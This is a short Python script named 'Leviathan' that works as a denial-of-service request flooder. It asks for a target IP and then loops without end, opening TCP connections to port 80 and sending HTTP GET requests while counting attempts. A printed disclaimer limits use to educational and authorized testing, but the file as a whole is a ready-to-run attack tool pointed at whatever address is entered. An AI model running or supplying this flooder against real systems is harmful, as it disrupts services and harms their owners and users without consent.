#import socket module
import socket

#variable for text color

#error
Red = "\033[91m"
#attempt successful
Green = "\033[92m"
#Normal text
Blue = "\033[94m"
#settinh to default color
reset_color = "\033[0m" 


#main attack function
def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    #try to connect to the server
    try:
        s.connect((ip, port))
        data = f'GET / HTTP/1.1\r\nHost:{ip}\r\n\r\n'
        s.send(data.encode())
        print(f'{Green}[*] Attempt successful {attempt}{Green}')
    except ConnectionRefusedError:
        print(f'{Red}[*] Connection refused! Target may be down or the port is closed.{Red}')
        print(f"{Red}[*]Exiting Script!{Red}")
        exit()
    except socket.error as e:
        print(f'{Red}[*] Socket error: {e}{Red}')
        print(f"{Red}[*]Exiting Script!{Red}")
        exit()
    except Exception as e:
        print(f'{Red}[*] An unexpected error occurred: {e}{Red}')
        print(f"{Red}[*]Exiting Script!{Red}")
    finally:
        s.close()

#Credits and Warning
print(f"{Blue}#####Leviathan#####{reset_color}")
print(f"{Blue}[*]Credit: Morta1DieTw1Ce{reset_color}")
print(f"{Blue}[*] Warning: This tool is intended for educational and authorized testing purposes only.{reset_color}")
print(f"{Blue}[*] Unauthorized use for any malicious or illegal activities is strictly prohibited.{reset_color}")
print(f"{Blue}[*] The creator of this tool does not support any misuse or harm caused by its usage.{reset_color}\n")
#target ip
ip = input(f'{Blue}[*] Enter Target\'s IP:{reset_color}')
port = 80
attempt = 0


while True:
    attempt += 1
    attack()
